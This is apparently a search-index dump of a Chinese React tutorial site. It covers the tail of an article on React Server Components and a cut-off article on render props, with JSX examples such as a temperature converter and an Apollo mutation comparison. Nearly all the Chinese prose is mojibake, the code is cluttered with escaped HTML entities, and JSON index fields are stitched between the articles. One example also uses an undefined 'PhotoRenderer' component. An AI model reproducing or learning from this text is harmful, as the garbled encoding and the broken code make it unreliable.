å½“åº”ç”¨ç¨‹åºå¼€å§‹åŠ è½½å½±å“ç”¨æˆ·ä½“éªŒçš„ç»„ä»¶æ—¶ï¼Œå®ƒå¯èƒ½ä¼šå»¶è¿Ÿã€‚\n  æœåŠ¡å™¨ç»„ä»¶å¼•å…¥äº†è‡ªåŠ¨ä»£ç æ‹†åˆ†ï¼Œå°†å®¢æˆ·ç«¯ç»„ä»¶ä¸­çš„æ‰€æœ‰æ­£å¸¸å¯¼å…¥è§†ä¸ºå¯èƒ½çš„ä»£ç æ‹†åˆ†ç‚¹ã€‚\nå®ƒä»¬è¿˜å…è®¸å¼€å‘äººå‘˜æ›´æ—©åœ°ï¼ˆåœ¨æœåŠ¡å™¨ä¸Šï¼‰é€‰æ‹©è¦ä½¿ç”¨çš„ç»„ä»¶ï¼Œä»è€Œå…è®¸å®¢æˆ·ç«¯åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­æ›´æ—©åœ°è·å–å®ƒã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import React from \u0026#34;react\u0026#34;; // å…¶ä¸­ä¹‹ä¸€å°†å¼€å§‹åŠ è½½*ä¸€æ—¦å‘ˆç°å¹¶æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯*ï¼š import OldPhotoRenderer from \u0026#34;./OldPhotoRenderer.client.js\u0026#34;; import NewPhotoRenderer from \u0026#34;./NewPhotoRenderer.client.js\u0026#34;; function Photo(props) { // åˆ‡æ¢åŠŸèƒ½æ ‡ç­¾ã€ç™»å½•/æ³¨é”€ã€å†…å®¹ç±»å‹ç­‰ï¼š  if (FeatureFlags.useNewPhotoRenderer) { return \u0026lt;NewPhotoRenderer {...props} /\u0026gt;; } else { return \u0026lt;PhotoRenderer {...props} /\u0026gt;; } }   \ræœåŠ¡å™¨ç»„ä»¶ä¼šå–ä»£ Next.js SSR å—ï¼Ÿ ä¸ï¼Œå®ƒä»¬å®Œå…¨ä¸åŒã€‚ éšç€ç ”ç©¶å’Œå®éªŒçš„ç»§ç»­ï¼ŒæœåŠ¡å™¨ç»„ä»¶çš„åˆå§‹é‡‡ç”¨å®é™…ä¸Šå°†é€šè¿‡ Next.js ç­‰å…ƒæ¡†æ¶è¿›è¡Œè¯•éªŒã€‚\næ€»ç»“ä¸€ä¸‹ Dan Abramov å¯¹ Next.js SSR å’ŒæœåŠ¡å™¨ç»„ä»¶ä¹‹é—´å·®å¼‚çš„ä¸€ä¸ªå¾ˆå¥½çš„è§£é‡Šï¼š\n  æœåŠ¡å™¨ç»„ä»¶çš„ä»£ç æ°¸è¿œä¸ä¼šäº¤ä»˜ç»™å®¢æˆ·ç«¯ã€‚ åœ¨è®¸å¤šä½¿ç”¨ React çš„ SSR å®ç°ä¸­ï¼Œç»„ä»¶ä»£ç æ— è®ºå¦‚ä½•éƒ½æ˜¯é€šè¿‡ JavaScript åŒ…å‘é€åˆ°å®¢æˆ·ç«¯çš„ã€‚ è¿™ä¼šå»¶è¿Ÿäº¤äº’ã€‚\n  æœåŠ¡å™¨ç»„ä»¶å…è®¸ä»æ ‘ä¸­çš„ä»»ä½•ä½ç½®è®¿é—®åç«¯ã€‚ ä½¿ç”¨ Next.js æ—¶ï¼Œæ‚¨ä¹ æƒ¯äºé€šè¿‡ getServerProps() è®¿é—®åç«¯ï¼Œå®ƒå…·æœ‰ä»…åœ¨é¡¶çº§é¡µé¢å·¥ä½œçš„é™åˆ¶ã€‚ éšæœº npm ç»„ä»¶æ— æ³•åšåˆ°è¿™ä¸€ç‚¹ã€‚\n  æœåŠ¡å™¨ç»„ä»¶å¯ä»¥åœ¨ä¿æŒæ ‘å†…éƒ¨çš„å®¢æˆ·ç«¯çŠ¶æ€çš„åŒæ—¶é‡æ–°è·å–ã€‚ è¿™æ˜¯å› ä¸ºä¸»è¦ä¼ è¾“æœºåˆ¶æ¯” HTML ä¸°å¯Œå¾—å¤šï¼Œå…è®¸é‡æ–°è·å–æœåŠ¡å™¨å‘ˆç°çš„éƒ¨åˆ†ï¼ˆä¾‹å¦‚æœç´¢ç»“æœåˆ—è¡¨ï¼‰è€Œä¸ä¼šç ´åå†…éƒ¨çŠ¶æ€ï¼ˆä¾‹å¦‚æœç´¢è¾“å…¥æ–‡æœ¬ã€ç„¦ç‚¹ã€æ–‡æœ¬é€‰æ‹©ï¼‰\n  æœåŠ¡å™¨ç»„ä»¶çš„ä¸€äº›æ—©æœŸé›†æˆå·¥ä½œå°†é€šè¿‡ webpack æ’ä»¶å®Œæˆï¼š\n  å®šä½æ‰€æœ‰å®¢æˆ·ç«¯ç»„ä»¶\n  åˆ›å»º ID =\u0026gt; å— URL ä¹‹é—´çš„æ˜ å°„\n  Node.js åŠ è½½å™¨ä½¿ç”¨å¯¹æ­¤æ˜ å°„çš„å¼•ç”¨æ›¿æ¢å¯¹å®¢æˆ·ç«¯ç»„ä»¶çš„å¯¼å…¥ã€‚\n  å…¶ä¸­ä¸€äº›å·¥ä½œå°†éœ€è¦æ›´æ·±å…¥çš„é›†æˆï¼ˆä¾‹å¦‚ä¸è·¯ç”±ä¹‹ç±»çš„éƒ¨åˆ†ï¼‰ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè®©å®ƒä¸åƒ Next.js è¿™æ ·çš„æ¡†æ¶ä¸€èµ·å·¥ä½œå°†æ˜¯æœ‰ä»·å€¼çš„ã€‚\n  æ­£å¦‚ä¸¹æŒ‡å‡ºçš„é‚£æ ·ï¼Œè¿™é¡¹å·¥ä½œçš„ç›®æ ‡ä¹‹ä¸€æ˜¯ä½¿å…ƒæ¡†æ¶å˜å¾—æ›´å¥½ã€‚\n\räº†è§£æ›´å¤šä¿¡æ¯å¹¶ä¸ React å›¢é˜Ÿåˆ†äº«åé¦ˆ è¦äº†è§£æœ‰å…³è¿™é¡¹å·¥ä½œçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è§‚çœ‹ Dan å’Œ Lauren çš„æ¼”è®²ï¼Œ\né˜…è¯» RFC å¹¶æŸ¥çœ‹æœåŠ¡å™¨ç»„ä»¶æ¼”ç¤ºä»¥è¿›è¡Œè¿™é¡¹å·¥ä½œã€‚ æ„Ÿè°¢ Sebastian MarkbÃ¥geã€Lauren Tanã€Joseph Savona å’Œ Dan Abramov åœ¨æœåŠ¡å™¨ç»„ä»¶æ–¹é¢æ‰€åšçš„å·¥ä½œã€‚\næœ‰è¶£çš„ç›¸å…³ä¸»é¢˜ï¼š\n Lauren Tan on Server Components Sophie Alpert explaining them Sebastian MarkbÃ¥ge with a discussion on hydration HN discussion thread  \rçŸ¥è¯†ç‚¹    ","description":"æœåŠ¡å™¨ç»„ä»¶è¡¥å…… SSRï¼Œæ— éœ€æ·»åŠ åˆ° JavaScript åŒ…å³å¯å‘ˆç°ä¸ºä¸­é—´æŠ½è±¡","id":119,"section":"react-patterns","tags":null,"title":"React æœåŠ¡å™¨ç»„ä»¶ âœ”","uri":"https://codthing.github.io/react-patterns/render-patterns/react-server-components/"},{"content":"è¿™æ˜¯å†å²é—ç•™é—®é¢˜ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨ï¼ˆç°åœ¨æœ‰äº†Hooksï¼‰ï¼Œåœ¨è¿™é‡Œåªæ˜¯è®©æˆ‘ä»¬äº†è§£è¿™æ®µå†å²\né€šè¿‡ props é“å…·å°† JSX å…ƒç´ ä¼ é€’ç»™ç»„ä»¶\nåœ¨é«˜é˜¶ç»„ä»¶éƒ¨åˆ†ï¼Œæˆ‘ä»¬çœ‹åˆ°å¦‚æœå¤šä¸ªç»„ä»¶éœ€è¦è®¿é—®ç›¸åŒçš„æ•°æ®æˆ–åŒ…å«ç›¸åŒçš„é€»è¾‘ï¼Œé‚£ä¹ˆèƒ½å¤Ÿé‡ç”¨ç»„ä»¶é€»è¾‘ä¼šéå¸¸æ–¹ä¾¿ã€‚\nå¦ä¸€ç§ä½¿ç»„ä»¶éå¸¸å¯é‡ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ render é“å…·æ¨¡å¼ã€‚ render é“å…·æ˜¯ç»„ä»¶ä¸Šçš„é“å…·ï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªè¿”å› JSX å…ƒç´ çš„å‡½æ•°ã€‚ é™¤äº† render é“å…·ä¹‹å¤–ï¼Œç»„ä»¶æœ¬èº«ä¸ä¼šæ¸²æŸ“ä»»ä½•ä¸œè¥¿ã€‚ ç›¸åï¼Œç»„ä»¶åªæ˜¯è°ƒç”¨ render é“å…·ï¼Œè€Œä¸æ˜¯å®ç°è‡ªå·±çš„æ¸²æŸ“é€»è¾‘ã€‚\n\rrender é“å…· å‡è®¾æœ‰ä¸€ä¸ª Title ç»„ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒTitle ç»„ä»¶é™¤äº†æ¸²æŸ“ä¼ é€’çš„å€¼ä¹‹å¤–ä¸åº”è¯¥åšä»»ä½•äº‹æƒ…ã€‚ æˆ‘ä»¬å¯ä»¥ä¸ºæ­¤ä½¿ç”¨ render é“å…·ï¼ è®©æˆ‘ä»¬å°† Title ç»„ä»¶æ¸²æŸ“çš„å€¼ä¼ é€’ç»™ render é“å…·ã€‚\n\u0026lt;Title render={() =\u0026gt; \u0026lt;h1\u0026gt;I am a render prop!\u0026lt;/h1\u0026gt;} /\u0026gt; åœ¨ Title ç»„ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡è¿”å›è°ƒç”¨çš„ render é“å…·æ¥æ¸²æŸ“è¿™äº›æ•°æ®ï¼\nconst Title = props =\u0026gt; props.render(); å¯¹äº Component å…ƒç´ ï¼Œæˆ‘ä»¬å¿…é¡»ä¼ é€’ä¸€ä¸ªåä¸º render çš„é“å…·ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¿”å› React å…ƒç´ çš„å‡½æ•°ã€‚\nimport React from \u0026#34;react\u0026#34;;\rimport { render } from \u0026#34;react-dom\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rconst Title = (props) =\u0026gt; props.render();\rrender(\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Title\rrender={() =\u0026gt; (\r\u0026lt;h1\u0026gt;\r\u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt;\râœ¨\r\u0026lt;/span\u0026gt;\rI am a render prop!{\u0026#34; \u0026#34;}\r\u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt;\râœ¨\r\u0026lt;/span\u0026gt;\r\u0026lt;/h1\u0026gt;\r)}\r/\u0026gt;\r\u0026lt;/div\u0026gt;,\rdocument.getElementById(\u0026#34;root\u0026#34;)\r); Perfectï¼Œå·¥ä½œé¡ºåˆ©ï¼ render é“å…·å¾ˆé…·çš„ä¸€ç‚¹æ˜¯ï¼Œæ¥æ”¶é“å…·çš„ç»„ä»¶æ˜¯éå¸¸å¯é‡ç”¨çš„ã€‚\næˆ‘ä»¬å¯ä»¥å¤šæ¬¡ä½¿ç”¨å®ƒï¼Œæ¯æ¬¡å°†ä¸åŒçš„å€¼ä¼ é€’ç»™ render é“å…·ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import React from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import \u0026#34;./styles.css\u0026#34;; const Title = (props) =\u0026gt; props.render(); render(//æ³¨æ„ï¼Œè¿™ä¸ªæ‰æ˜¯æœ¬æ–‡æ‰€è¯´çš„ render é“å…·  \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Title render={() =\u0026gt; \u0026lt;h1\u0026gt;âœ¨ First render prop! âœ¨\u0026lt;/h1\u0026gt;} /\u0026gt; \u0026lt;Title render={() =\u0026gt; \u0026lt;h2\u0026gt;ğŸ”¥ Second render prop! ğŸ”¥\u0026lt;/h2\u0026gt;} /\u0026gt; \u0026lt;Title render={() =\u0026gt; \u0026lt;h3\u0026gt;ğŸš€ Third render prop! ğŸš€\u0026lt;/h3\u0026gt;} /\u0026gt; \u0026lt;/div\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;) );   è™½ç„¶å®ƒä»¬è¢«ç§°ä¸º render é“å…·ï¼Œä½†ä¸Šé¢Titleä¸­çš„ render é“å…·ä¸ä¸€å®šè¦è¢«ç§°ä¸º renderã€‚ï¼ˆæ³¨æ„å’Œæœ¬æ–‡æ‰€è¿°çš„çœŸæ­£çš„ render é“å…·çš„åŒºåˆ«ï¼‰\nä»»ä½•æ¸²æŸ“ JSX çš„é“å…·éƒ½è¢«è§†ä¸ºæ¸²æŸ“é“å…·ï¼ è®©æˆ‘ä»¬é‡å‘½åä¸Šä¸€ä¸ªç¤ºä¾‹ä¸­ä½¿ç”¨çš„æ¸²æŸ“é“å…·ï¼Œå¹¶ä¸ºå®ƒä»¬æŒ‡å®šç‰¹å®šçš„åç§°ï¼\nimport React from \u0026#34;react\u0026#34;;\rimport { render } from \u0026#34;react-dom\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rconst Title = (props) =\u0026gt; (\r\u0026lt;\u0026gt;\r{props.renderFirstComponent()}\r{props.renderSecondComponent()}\r{props.renderThirdComponent()}\r\u0026lt;/\u0026gt;\r);\rrender(\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Title\rrenderFirstComponent={() =\u0026gt; \u0026lt;h1\u0026gt;âœ¨ First render prop! âœ¨\u0026lt;/h1\u0026gt;}\rrenderSecondComponent={() =\u0026gt; \u0026lt;h2\u0026gt;ğŸ”¥ Second render prop! ğŸ”¥\u0026lt;/h2\u0026gt;}\rrenderThirdComponent={() =\u0026gt; \u0026lt;h3\u0026gt;ğŸš€ Third render prop! ğŸš€\u0026lt;/h3\u0026gt;}\r/\u0026gt;\r\u0026lt;/div\u0026gt;,\rdocument.getElementById(\u0026#34;root\u0026#34;)\r); Greatï¼ æˆ‘ä»¬åˆšåˆšçœ‹åˆ°å¯ä»¥ä½¿ç”¨ render é“å…·æ¥ä½¿ç»„ä»¶å¯é‡ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡éƒ½å¯ä»¥å°†ä¸åŒçš„æ•°æ®ä¼ é€’ç»™ render é“å…·ã€‚\nä½†æ˜¯ï¼Œä¸ºä»€ä¹ˆè¦ä½¿ç”¨è¿™ä¸ªï¼Ÿ\nä¸€ä¸ªæ¥å— render é“å…·çš„ç»„ä»¶é€šå¸¸ä¸ä»…ä»…æ˜¯ç®€å•åœ°è°ƒç”¨ render é“å…·ã€‚ ç›¸åï¼Œæˆ‘ä»¬é€šå¸¸å¸Œæœ›å°†æ•°æ®ä»æ¥å— render é“å…·çš„ç»„ä»¶ä¼ é€’åˆ°ä½œä¸º render é“å…·ä¼ é€’çš„å…ƒç´ ï¼\nfunction Component(props) {\rconst data = { ... }\rreturn props.render(data)\r} render é“å…·ç°åœ¨å¯ä»¥æ¥æ”¶ä½œä¸ºå‚æ•°ä¼ é€’çš„è¿™ä¸ªå€¼ã€‚\n\u0026lt;Component render={data =\u0026gt; \u0026lt;ChildComponent data={data} /\u0026gt;} \ræ¡ˆä¾‹åˆ†æ è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼ æœ‰ä¸€ä¸ªç®€å•çš„åº”ç”¨ç¨‹åºï¼Œç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­è¾“å…¥æ‘„æ°æ¸©åº¦ã€‚ è¯¥åº”ç”¨ç¨‹åºä»¥åæ°åº¦å’Œå¼€å°”æ–‡æ˜¾ç¤ºè¯¥æ¸©åº¦çš„å€¼ã€‚\nimport React, { useState } from \u0026#34;react\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rfunction Input() {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rvalue={value}\ronChange={e =\u0026gt; setValue(e.target.value)}\rplaceholder=\u0026#34;Temp in Â°C\u0026#34;\r/\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;â˜ƒï¸ Temperature Converter ğŸŒ\u0026lt;/h1\u0026gt;\r\u0026lt;Input /\u0026gt;\r\u0026lt;Kelvin /\u0026gt;\r\u0026lt;Fahrenheit /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction Kelvin({ value = 0 }) {\rreturn \u0026lt;div className=\u0026#34;temp\u0026#34;\u0026gt;{value + 273.15}K\u0026lt;/div\u0026gt;;\r}\rfunction Fahrenheit({ value = 0 }) {\rreturn \u0026lt;div className=\u0026#34;temp\u0026#34;\u0026gt;{(value * 9) / 5 + 32}Â°F\u0026lt;/div\u0026gt;;\r} å—¯.. ç›®å‰æœ‰é—®é¢˜ã€‚ æœ‰çŠ¶æ€çš„ Input ç»„ä»¶åŒ…å«ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œè¿™æ„å‘³ç€ Fahrenheit å’Œ Kelvin ç»„ä»¶æ— æƒè®¿é—®ç”¨æˆ·çš„è¾“å…¥ï¼\n- - - åŠèµ·çŠ¶æ€ åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨æˆ·è¾“å…¥å¯ç”¨äºåæ°åº¦å’Œå¼€å°”æ–‡åˆ†é‡çš„ä¸€ç§æ–¹æ³•æ˜¯ï¼Œè§£é™¤çŠ¶æ€ã€‚\næˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰çŠ¶æ€çš„ Input ç»„ä»¶ã€‚ ä½†æ˜¯ï¼Œå…„å¼Ÿç»„ä»¶ Fahrenheit å’Œ Kelvin ä¹Ÿéœ€è¦è®¿é—®è¿™äº›æ•°æ®ã€‚ å¯ä»¥å°†çŠ¶æ€æå‡åˆ°ä¸ Inputã€Fahrenheit å’Œ Kelvin æœ‰è¿æ¥çš„ç¬¬ä¸€ä¸ªå…¬å…±ç¥–å…ˆç»„ä»¶ï¼Œè€Œä¸æ˜¯æœ‰çŠ¶æ€çš„ Input ç»„ä»¶ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯ App ç»„ä»¶ï¼\nfunction Input({ value, handleChange }) {\rreturn \u0026lt;input value={value} onChange={e =\u0026gt; handleChange(e.target.value)} /\u0026gt;;\r}\rexport default function App() {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;â˜ƒï¸ Temperature Converter ğŸŒ\u0026lt;/h1\u0026gt;\r\u0026lt;Input value={value} handleChange={setValue} /\u0026gt;\r\u0026lt;Kelvin value={value} /\u0026gt;\r\u0026lt;Fahrenheit value={value} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} å°½ç®¡è¿™æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆï¼Œä½†åœ¨å…·æœ‰å¤„ç†è®¸å¤šå­çº§çš„ç»„ä»¶çš„å¤§å‹åº”ç”¨ç¨‹åºä¸­æå‡çŠ¶æ€å¯èƒ½ä¼šå¾ˆæ£˜æ‰‹ã€‚ æ¯ä¸ªçŠ¶æ€æ›´æ”¹éƒ½å¯èƒ½å¯¼è‡´é‡æ–°æ¸²æŸ“æ‰€æœ‰å­é¡¹ï¼Œå³ä½¿æ˜¯é‚£äº›ä¸å¤„ç†æ•°æ®çš„å­é¡¹ï¼Œè¿™å¯èƒ½ä¼šå¯¹æ‚¨çš„åº”ç”¨ç¨‹åºçš„æ€§èƒ½äº§ç”Ÿè´Ÿé¢å½±å“ã€‚\n- - - render é“å…· ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ render é“å…·ï¼ è®©æˆ‘ä»¬ä»¥ä¸€ç§å¯ä»¥æ¥æ”¶ render é“å…·çš„æ–¹å¼æ›´æ”¹ Input ç»„ä»¶ã€‚\nfunction Input(props) {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rvalue={value}\ronChange={e =\u0026gt; setValue(e.target.value)}\rplaceholder=\u0026#34;Temp in Â°C\u0026#34;\r/\u0026gt;\r{props.render(value)}\r\u0026lt;/\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;â˜ƒï¸ Temperature Converter ğŸŒ\u0026lt;/h1\u0026gt;\r\u0026lt;Input\rrender={value =\u0026gt; (\r\u0026lt;\u0026gt;\r\u0026lt;Kelvin value={value} /\u0026gt;\r\u0026lt;Fahrenheit value={value} /\u0026gt;\r\u0026lt;/\u0026gt;\r)}\r/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} Perfect, Kelvin å’Œ Fahrenheit ç°åœ¨å¯ä»¥è®¿é—®ç”¨æˆ·è¾“å…¥çš„å€¼ï¼\n\rä½œä¸ºå‡½æ•°çš„ children é™¤äº†å¸¸è§„çš„ JSX ç»„ä»¶ï¼Œè¿˜å¯ä»¥å°†å‡½æ•°ä½œä¸ºå­ç»„ä»¶ä¼ é€’ç»™ React ç»„ä»¶ã€‚ å¯ä»¥é€šè¿‡ children é“å…·ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œå®ƒåœ¨æŠ€æœ¯ä¸Šä¹Ÿæ˜¯ä¸€ä¸ª render é“å…·ã€‚\nè®©æˆ‘ä»¬æ›´æ”¹è¾“å…¥ç»„ä»¶ã€‚ æˆ‘ä»¬ä¸ä¼šæ˜¾å¼åœ°ä¼ é€’ render é“å…·ï¼Œè€Œæ˜¯å°†ä¸€ä¸ªå‡½æ•°ä½œä¸º Input ç»„ä»¶çš„å­ç»„ä»¶ä¼ é€’ã€‚\nexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;â˜ƒï¸ Temperature Converter ğŸŒ\u0026lt;/h1\u0026gt;\r\u0026lt;Input\u0026gt;\r{value =\u0026gt; (\r\u0026lt;\u0026gt;\r\u0026lt;Kelvin value={value} /\u0026gt;\r\u0026lt;Fahrenheit value={value} /\u0026gt;\r\u0026lt;/\u0026gt;\r)}\r\u0026lt;/Input\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æˆ‘ä»¬å¯ä»¥é€šè¿‡ Input ç»„ä»¶ä¸Šå¯ç”¨çš„ props.children å±æ€§è®¿é—®è¿™ä¸ªå‡½æ•°ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„å€¼è°ƒç”¨ props.childrenï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„å€¼è°ƒç”¨ props.renderã€‚\nfunction Input(props) {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rvalue={value}\ronChange={e =\u0026gt; setValue(e.target.value)}\rplaceholder=\u0026#34;Temp in Â°C\u0026#34;\r/\u0026gt;\r{props.children(value)}\r\u0026lt;/\u0026gt;\r);\r} å¤ªå¥½äº†ï¼Œè¿™æ · Kelvin å’Œ Fahrenheit ç»„ä»¶å¯ä»¥è®¿é—®è¯¥å€¼ï¼Œè€Œä¸å¿…æ‹…å¿ƒ render é“å…·çš„åç§°ã€‚\n\rHooks åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨ Hooks æ›¿æ¢æ¸²æŸ“é“å…·ã€‚ Apollo Client å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚\næ— éœ€ä½¿ç”¨ Apollo Client çš„ç»éªŒå³å¯ç†è§£æ­¤ç¤ºä¾‹ã€‚\nä½¿ç”¨ Apollo Client çš„ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡ Mutation å’Œ Query ç»„ä»¶ã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹é«˜é˜¶ç»„ä»¶éƒ¨åˆ†ä¸­ä»‹ç»çš„ç›¸åŒè¾“å…¥ç¤ºä¾‹ã€‚ ç°åœ¨å°†ä½¿ç”¨æ¥æ”¶ render é“å…·çš„ Mutation ç»„ä»¶ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ graphql() é«˜é˜¶ç»„ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //App.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import InputRenderProp from \u0026#34;./InputRenderProp\u0026#34;; import InputHooks from \u0026#34;./InputHooks\u0026#34;; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Render Prop\u0026lt;/h3\u0026gt; \u0026lt;InputRenderProp /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Hooks\u0026lt;/h3\u0026gt; \u0026lt;InputHooks /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11  //resolvers.js import { gql } from \u0026#34;apollo-boost\u0026#34;; export const ADD_MESSAGE = gql` mutation AddMessage($message: String!) { addMessage(message: $message) { message } } `;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  //InputRenderProp.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { Mutation } from \u0026#34;react-apollo\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; export default class Input extends React.Component { constructor() { super(); this.state = { message: \u0026#34;\u0026#34; }; } handleChange = (e) =\u0026gt; { this.setState({ message: e.target.value }); }; render() { return ( \u0026lt;Mutation mutation={ADD_MESSAGE} variables={{ message: this.state.message }} onCompleted={() =\u0026gt; console.log(`Added with render prop: ${this.state.message}`) } \u0026gt; {(addMessage) =\u0026gt; ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={this.handleChange} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={addMessage}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; )} \u0026lt;/Mutation\u0026gt; ); } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  //InputHooks.js import React, { useState } from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { useMutation } from \u0026#34;@apollo/react-hooks\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; export default function Input() { const [message, setMessage] = useState(\u0026#34;\u0026#34;); const [addMessage] = useMutation(ADD_MESSAGE, { variables: { message }, onCompleted: () =\u0026gt; console.log(`Added with hook: ${message}`) }); return ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={(e) =\u0026gt; setMessage(e.target.value)} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={addMessage}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }   ä¸ºäº†å°†æ•°æ®ä» Mutation ç»„ä»¶å‘ä¸‹ä¼ é€’åˆ°éœ€è¦æ•°æ®çš„å…ƒç´ ï¼Œæˆ‘ä»¬å°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºå­é¡¹ä¼ é€’ã€‚ è¯¥å‡½æ•°é€šè¿‡å…¶å‚æ•°æ¥æ”¶æ•°æ®çš„å€¼ã€‚\n\u0026lt;Mutation mutation={...} variables={...}\u0026gt;\r{addMessage =\u0026gt; \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt;...\u0026lt;/div\u0026gt;}\r\u0026lt;/Mutation\u0026gt; å°½ç®¡æˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨ render é“å…·æ¨¡å¼å¹¶ä¸”ä¸é«˜é˜¶ç»„ä»¶æ¨¡å¼ç›¸æ¯”é€šå¸¸æ›´å—æ¬¢è¿ï¼Œä½†å®ƒæœ‰å…¶ç¼ºç‚¹ã€‚\nç¼ºç‚¹ä¹‹ä¸€æ˜¯ç»„ä»¶åµŒå¥—è¾ƒæ·±ã€‚ å¦‚æœä¸€ä¸ªç»„ä»¶éœ€è¦è®¿é—®å¤šä¸ªçªå˜æˆ–æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥åµŒå¥—å¤šä¸ª Mutation æˆ– Query ç»„ä»¶ã€‚\n\u0026lt;Mutation mutation={FIRST_MUTATION}\u0026gt;\r{firstMutation =\u0026gt; (\r\u0026lt;Mutation mutation={SECOND_MUTATION}\u0026gt;\r{secondMutation =\u0026gt; (\r\u0026lt;Mutation mutation={THIRD_MUTATION}\u0026gt;\r{thirdMutation =\u0026gt; (\r\u0026lt;Element\rfirstMutation={firstMutation}\rsecondMutation={secondMutation}\rthirdMutation={thirdMutation}\r/\u0026gt;\r)}\r\u0026lt;/Mutation\u0026gt;\r)}\r\u0026lt;/Mutation\u0026gt;\r)}\r\u0026lt;/Mutation\u0026gt; åœ¨ Hooks 